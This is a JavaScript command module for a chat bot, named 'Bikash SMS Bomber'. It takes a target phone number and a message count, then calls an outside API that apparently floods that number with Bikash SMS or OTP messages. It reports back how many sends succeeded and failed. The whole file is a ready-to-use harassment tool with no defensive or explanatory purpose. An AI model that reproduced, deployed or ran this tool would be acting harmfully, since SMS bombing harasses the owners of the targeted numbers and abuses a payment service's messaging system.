const axios = require('axios');
const dipto = "https://www.noobs-api.rf.gd";

module.exports.config = {
    name: "bikashbomber",
    version: "2.0",
    author: "Dip To",
    countDown: 5,
    role: 1,
    category: "Bomber",
    description: "Bikash SMS Bomber",
    usages: "{pn} number [limit=1]",
    dependencies: {
        "axios": ""
    }
};

module.exports.onStart = async ({ api, args, message }) => {
    try {
        const number = args[0];
        const limit = args[1] || 10;

        if (!number) return message.reply("🔴 | Error: Phone number required!");
        if (!/^[0-9]+$/.test(number)) return message.reply("🔴 | Error: Invalid phone number!");
        if (limit > 15) return message.reply("🔴 | Error: Maximum limit is 15!");

        const processingMsg = await message.reply("💣 | Activating Bikash Bomber...");

        const { data } = await axios.get(`${dipto}/dipto/bikashBomber?number=${encodeURIComponent(number)}&limit=${limit}`);

        await api.unsendMessage(processingMsg.messageID);

        message.reply(`
⚡ Bikash Bomber Results ⚡

📱 Target: ${number}
💣 Total: ${data.success + data.failed}
✅ Success: ${data.success}
❌ Failed: ${data.failed}

📊 Status: ${data.message}
        `.trim());

    } catch (error) {
        console.error(error);
        message.reply(`🔴 | Bomber Failed! ${error.message}`);
    }
};